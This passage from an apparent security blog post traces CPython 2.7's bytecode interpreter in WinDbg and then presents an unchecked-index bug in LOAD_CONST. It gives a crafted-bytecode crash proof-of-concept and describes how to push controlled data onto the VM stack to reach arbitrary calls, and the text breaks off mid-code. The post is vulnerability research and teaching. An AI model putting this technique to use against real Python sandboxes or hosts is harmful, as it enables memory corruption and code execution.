</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">In</span> <span class="p">[</span><span class="mi">11</span><span class="p">]:</span> <span class="s">&#39;</span><span class="si">%x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">opcode</span><span class="o">.</span><span class="n">HAVE_ARGUMENT</span>
</span><span class='line'><span class="n">Out</span><span class="p">[</span><span class="mi">11</span><span class="p">]:</span> <span class="s">&#39;5a&#39;</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>HAS_ARG</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define HAS_ARG(op) ((op) &gt;= HAVE_ARGUMENT)</span>
</span></code></pre></td></tr></table></div></figure>


<p>If the opcode has an argument, the function needs to retrieve it (it&rsquo;s one byte):</p>

<figure class='code'><figcaption><span>Fetching the argument</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=025ea915 edx=026bef98 esi=1e222c0c edi=00000000
</span><span class='line'>eip=1e0ec571 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl nz na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200206
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2c1:
</span><span class='line'>1e0ec571 0fb67901        movzx   edi,byte ptr [ecx+1]       ds:002b:025ea916=00
</span></code></pre></td></tr></table></div></figure>


<p>As expected for the first <em>LOAD_FAST</em> the argument is <em>0x00</em>, perfect.
After that the function dispatches the execution flow to the <em>LOAD_FAST</em> case defined as follow:</p>

<figure class='code'><figcaption><span>LOAD_FAST definition</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define GETLOCAL(i)     (fastlocals[i])</span>
</span><span class='line'><span class="cp">#define Py_INCREF(op) (                         \</span>
</span><span class='line'><span class="cp">    _Py_INC_REFTOTAL  _Py_REF_DEBUG_COMMA       \</span>
</span><span class='line'><span class="cp">    ((PyObject*)(op))-&gt;ob_refcnt++)</span>
</span><span class='line'><span class="cp">#define PUSH(v)                BASIC_PUSH(v)</span>
</span><span class='line'><span class="cp">#define BASIC_PUSH(v)     (*stack_pointer++ = (v))</span>
</span><span class='line'>
</span><span class='line'><span class="k">case</span> <span class="n">LOAD_FAST</span>:
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="n">GETLOCAL</span><span class="p">(</span><span class="n">oparg</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">Py_INCREF</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>    <span class="n">PUSH</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>    <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="c1">//...</span>
</span><span class='line'>  <span class="k">break</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what it looks like in assembly:</p>

<figure class='code'><figcaption><span>Loads the fastlocals array (026bef98)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=0000007b edx=00000059 esi=1e222c0c edi=00000000
</span><span class='line'>eip=1e0ec5cf esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei ng nz na po cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
</span><span class='line'>python27!PyEval_EvalFrameEx+0x31f:
</span><span class='line'>1e0ec5cf 8b54246c        mov     edx,dword ptr [esp+6Ch] ss:002b:0027fd44=98ef6b02
</span></code></pre></td></tr></table></div></figure>


<p>After getting the <em>fastlocals</em>, we can retrieve an entry:</p>

<figure class='code'><figcaption><span>Retrieve the entry 0 of the fastlocals array</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=0000007b edx=026bef98 esi=1e222c0c edi=00000000
</span><span class='line'>eip=1e0ec5d3 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei ng nz na po cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
</span><span class='line'>python27!PyEval_EvalFrameEx+0x323:
</span><span class='line'>1e0ec5d3 8bb4ba38010000  mov     esi,dword ptr [edx+edi*4+138h] ds:002b:026bf0d0=a0aa5e02
</span></code></pre></td></tr></table></div></figure>


<p>Also keep in mind we called our dummy function with two strings, so let&rsquo;s actually check it is a string object:</p>

<figure class='code'><figcaption><span>Type checking</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt; dps 025eaaa0 l2
</span><span class='line'>025eaaa0  00000004
</span><span class='line'>025eaaa4  1e226798 python27!PyString_Type
</span></code></pre></td></tr></table></div></figure>


<p>Perfect, now according to the definition of <em>PyStringObject</em>:</p>

<figure class='code'><figcaption><span>PyStringObject</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">PyObject_VAR_HEAD</span>
</span><span class='line'>    <span class="kt">long</span> <span class="n">ob_shash</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">ob_sstate</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">ob_sval</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span> <span class="n">PyStringObject</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We should find the content of the string directly in the object:</p>

<figure class='code'><figcaption><span>Finding the string in the PyStringObject</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt; db 025eaaa0 l1f
</span><span class='line'>025eaaa0  04 00 00 00 98 67 22 1e-05 00 00 00 dd 16 30 43  .....g&quot;.......0C
</span><span class='line'>025eaab0  01 00 00 00 48 65 6c 6c-6f 00 00 00 ff ff ff     ....Hello......
</span></code></pre></td></tr></table></div></figure>


<p>Awesome, we have the size of the string at the offset <em>0x8</em>, and the actual string is at <em>0x14</em>.</p>

<p>Let&rsquo;s move on to the second opcode now, this time with less details though:</p>

<figure class='code'><figcaption><span>Fetching the second LOAD_FAST opcode</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=025ea917 edx=026bef98 esi=025eaaa0 edi=00000000
</span><span class='line'>eip=1e0ec562 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2b2:
</span><span class='line'>1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea917=7c
</span></code></pre></td></tr></table></div></figure>


<p>This time, we are loading the second argument, so the index 1 of <em>fastlocals</em>.
We can type-check the object and dump the string stored in it:</p>

<figure class='code'><figcaption><span>Retrieving the index 1 of fastlocals (025ea9c0)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=0000007b edx=026bef98 esi=025eaaa0 edi=00000001
</span><span class='line'>eip=1e0ec5d3 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei ng nz na po cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
</span><span class='line'>python27!PyEval_EvalFrameEx+0x323:
</span><span class='line'>1e0ec5d3 8bb4ba38010000  mov     esi,dword ptr [edx+edi*4+138h] ds:002b:026bf0d4=c0af5e02
</span><span class='line'>0:000&gt; db poi(026bf0d4) l1f
</span><span class='line'>025eafc0  04 00 00 00 98 67 22 1e-05 00 00 00 39 4a 25 29  .....g&quot;.....9J%)
</span><span class='line'>025eafd0  01 00 00 00 57 6f 72 6c-64 00 5e 02 79 00 00     ....World.^.y..
</span></code></pre></td></tr></table></div></figure>


<p>Comes now the <em>BINARY_ADD</em> opcode:</p>

<figure class='code'><figcaption><span>Fetching the BINARY_ADD opcode</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=025ea91a edx=026bef98 esi=025eafc0 edi=00000001
</span><span class='line'>eip=1e0ec562 esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2b2:
</span><span class='line'>1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea91a=17
</span></code></pre></td></tr></table></div></figure>


<p>Here it&rsquo;s supposed to retrieve the two objects on the top-of-stack, and add them.
The C code looks like this:</p>

<figure class='code'><figcaption><span>BINARY_ADD</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define SET_TOP(v)        (stack_pointer[-1] = (v))</span>
</span><span class='line'>
</span><span class='line'><span class="k">case</span> <span class="n">BINARY_ADD</span>:
</span><span class='line'>  <span class="n">w</span> <span class="o">=</span> <span class="n">POP</span><span class="p">();</span>
</span><span class='line'>  <span class="n">v</span> <span class="o">=</span> <span class="n">TOP</span><span class="p">();</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">PyInt_CheckExact</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">PyInt_CheckExact</span><span class="p">(</span><span class="n">w</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// Not our case</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">PyString_CheckExact</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>           <span class="n">PyString_CheckExact</span><span class="p">(</span><span class="n">w</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">x</span> <span class="o">=</span> <span class="n">string_concatenate</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="n">next_instr</span><span class="p">);</span>
</span><span class='line'>      <span class="cm">/* string_concatenate consumed the ref to v */</span>
</span><span class='line'>      <span class="k">goto</span> <span class="n">skip_decref_vx</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// Not our case</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">v</span><span class="p">);</span>
</span><span class='line'><span class="nl">skip_decref_vx:</span>
</span><span class='line'>  <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">w</span><span class="p">);</span>
</span><span class='line'>  <span class="n">SET_TOP</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>  <span class="k">break</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And here is the assembly version where it retrieves the two objects from the top-of-stack:</p>

<figure class='code'><figcaption><span>POP and TOP</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=00000017 ebx=00000000 ecx=00000016 edx=0000000f esi=025eafc0 edi=00000000
</span><span class='line'>eip=1e0eccf5 esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
</span><span class='line'>python27!PyEval_EvalFrameEx+0xa45:
</span><span class='line'>1e0eccf5 8b75f8          mov     esi,dword ptr [ebp-8] ss:002b:026bf0d8=a0aa5e02
</span><span class='line'>...
</span><span class='line'>0:000&gt;
</span><span class='line'>eax=1e226798 ebx=00000000 ecx=00000016 edx=0000000f esi=025eaaa0 edi=00000000
</span><span class='line'>eip=1e0eccfb esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
</span><span class='line'>python27!PyEval_EvalFrameEx+0xa4b:
</span><span class='line'>1e0eccfb 8b7dfc          mov     edi,dword ptr [ebp-4] ss:002b:026bf0dc=c0af5e02
</span><span class='line'>0:000&gt;
</span><span class='line'>eax=1e226798 ebx=00000000 ecx=00000016 edx=0000000f esi=025eaaa0 edi=025eafc0
</span><span class='line'>eip=1e0eccfe esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
</span><span class='line'>python27!PyEval_EvalFrameEx+0xa4e:
</span><span class='line'>1e0eccfe 83ed04          sub     ebp,4
</span></code></pre></td></tr></table></div></figure>


<p>A bit further we have our string concatenation:</p>

<figure class='code'><figcaption><span>String concatenation in string_concatenate</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=025eafc0 ebx=00000000 ecx=0027fcd0 edx=026bef98 esi=025eaaa0 edi=025eafc0
</span><span class='line'>eip=1e0eb733 esp=0027fcb8 ebp=00000005 iopl=0         nv up ei pl nz na po nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
</span><span class='line'>python27!PyEval_SliceIndex+0x813:
</span><span class='line'>1e0eb733 e83881fcff      call    python27!PyString_Concat (1e0b3870)
</span><span class='line'>0:000&gt; dd esp l3
</span><span class='line'>0027fcb8  0027fcd0 025eafc0 025eaaa0
</span><span class='line'>0:000&gt; p
</span><span class='line'>eax=025eaaa0 ebx=00000000 ecx=00000064 edx=000004fb esi=025eaaa0 edi=025eafc0
</span><span class='line'>eip=1e0eb738 esp=0027fcb8 ebp=00000005 iopl=0         nv up ei pl nz na po nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
</span><span class='line'>python27!PyEval_SliceIndex+0x818:
</span><span class='line'>1e0eb738 8b442418        mov     eax,dword ptr [esp+18h] ss:002b:0027fcd0=c0aa5e02
</span><span class='line'>0:000&gt; db poi(0027fcd0) l1f
</span><span class='line'>025eaac0  01 00 00 00 98 67 22 1e-0a 00 00 00 ff ff ff ff  .....g&quot;.........
</span><span class='line'>025eaad0  00 00 00 00 48 65 6c 6c-6f 57 6f 72 6c 64 00     ....HelloWorld.
</span></code></pre></td></tr></table></div></figure>


<p>And the last part of the case is to push the resulting string onto the virtual stack (<em>SET_TOP</em> operation):</p>

<figure class='code'><figcaption><span>Push the resulting object onto the virtual stack</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=025eaac0 ebx=025eaac0 ecx=00000005 edx=000004fb esi=025eaaa0 edi=025eafc0
</span><span class='line'>eip=1e0ecb82 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl nz ac po cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200213
</span><span class='line'>python27!PyEval_EvalFrameEx+0x8d2:
</span><span class='line'>1e0ecb82 895dfc          mov     dword ptr [ebp-4],ebx ss:002b:026bf0d8=a0aa5e02
</span></code></pre></td></tr></table></div></figure>


<p>Last part of our deep dive, the <em>RETURN_VALUE</em> opcode:</p>

<figure class='code'><figcaption><span>Fetching the RETURN_VALUE opcode</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=025eaac0 ebx=025eafc0 ecx=025ea91b edx=026bef98 esi=025eaac0 edi=025eafc0
</span><span class='line'>eip=1e0ec562 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2b2:
</span><span class='line'>1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea91b=53
</span></code></pre></td></tr></table></div></figure>


<p>All right, at least now you have a more precise idea about how that Python virtual machine works, and more importantly how you can directly debug it without symbols. Of course, you can download the debug symbols on Linux and use that information in gdb ; it should make your life easier (&hellip;.but I hate gdb man&hellip;).</p>

<p>Note that I would love very much to have a debugger at the Python bytecode level, it would be much easier than instrumenting the interpreter. If you know one ping me! If you build one ping me too :&ndash;).</p>

<h1>The bug</h1>

<p>Here is the bug, spot it and give it some love:</p>

<figure class='code'><figcaption><span>LOAD_CONST bug</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#ifndef Py_DEBUG</span>
</span><span class='line'><span class="cp">#define GETITEM(v, i) PyTuple_GET_ITEM((PyTupleObject *)(v), (i))</span>
</span><span class='line'><span class="cp">#else</span>
</span><span class='line'><span class="c1">//...</span>
</span><span class='line'><span class="cm">/* Macro, trading safety for speed &lt;-- LOL, :) */</span>
</span><span class='line'><span class="cp">#define PyTuple_GET_ITEM(op, i) (((PyTupleObject *)(op))-&gt;ob_item[i])</span>
</span><span class='line'>
</span><span class='line'><span class="k">case</span> <span class="n">LOAD_CONST</span>:
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="n">GETITEM</span><span class="p">(</span><span class="n">consts</span><span class="p">,</span> <span class="n">oparg</span><span class="p">);</span>
</span><span class='line'>  <span class="n">Py_INCREF</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>  <span class="n">PUSH</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>  <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This may be a bit obscure for you, but keep in mind we control the index <em>oparg</em> and the content of <em>consts</em>. That means we can just push <em>untrusted</em> data on the virtual stack of the VM: brilliant. Getting a crash out of this bug is fairly easy, try to run these lines (on a Python 2.7 distribution):</p>

<figure class='code'><figcaption><span>craaaaash</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">opcode</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">types</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">a</span><span class="p">():</span>
</span><span class='line'>  <span class="k">pass</span>
</span><span class='line'>
</span><span class='line'><span class="n">a</span><span class="o">.</span><span class="n">func_code</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">CodeType</span><span class="p">(</span>
</span><span class='line'>  <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;EXTENDED_ARG&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\xef\xbe</span><span class="s">&#39;</span> <span class="o">+</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;LOAD_CONST&#39;</span><span class="p">])</span>   <span class="o">+</span> <span class="s">&#39;</span><span class="se">\xad\xde</span><span class="s">&#39;</span><span class="p">,</span>
</span><span class='line'>  <span class="p">(),</span> <span class="p">(),</span> <span class="p">(),</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'><span class="n">a</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>..and as expected you get a fault (<em>oparg</em> is <em>edi</em>):</p>

<figure class='code'><figcaption><span>craaaaaaash</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>(2058.2108): Access violation - code c0000005 (!!! second chance !!!)
</span><span class='line'>[...]
</span><span class='line'>eax=01cb1030 ebx=00000000 ecx=00000063 edx=00000046 esi=1e222c0c edi=beefdead
</span><span class='line'>eip=1e0ec5f7 esp=0027e7f8 ebp=0273a9f0 iopl=0         nv up ei ng nz na pe cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
</span><span class='line'>python27!PyEval_EvalFrameEx+0x347:
</span><span class='line'>1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch] ds:002b:fd8a8af0=????????
</span></code></pre></td></tr></table></div></figure>


<p>By the way, some readers might have caught the same type of bug in <em>LOAD_FAST</em> with the <em>fastlocals</em> array ; those readers are definitely right :).</p>

<h1>Walking through the PoC</h1>

<p>OK, so if you look only at the faulting instruction you could say that the bug is minor and we won&rsquo;t be able to turn it into something &ldquo;useful&rdquo;. But the essential piece when you want to exploit a software is to actually completely understand how it works. Then you are more capable of turning bugs that seems useless into interesting primitives.</p>

<p>As we said several times, from Python code you can&rsquo;t really push any value you want onto the Python virtual stack, obviously. The machine is only dealing with Python objects. However, with this bug we can corrupt the virtual stack by pushing arbitrary data that we control. If you do that well, you can end up causing the Python VM to call whatever address you want. That&rsquo;s exactly what I did back when I wrote <a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py">python27_abuse_vm_to_execute_x86_code.py</a>.</p>

<p>In Python we are really lucky because we can control a lot of things in memory and we have natively a way to &ldquo;leak&rdquo; (I shouldn&rsquo;t call that a leak though because it&rsquo;s a feature) the address of a Python object with the function <em>id</em>. So basically we can do stuff, we can do it reliably and we can manage to not break the interpreter, like bosses.</p>

<h2>Pushing attacker-controlled data on the virtual stack</h2>

<p>We control <em>oparg</em> and the content of the tuple <em>consts</em>. We can also find out the address of that tuple. So we can have a Python string object that stores an arbitrary value, let&rsquo;s say <em>0xdeadbeef</em> and it will be pushed on the virtual stack.</p>

<p>Let&rsquo;s do that in Python now:</p>

<figure class='code'><figcaption><span>Pushing controlled value on the virtual stack</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">opcode</span>
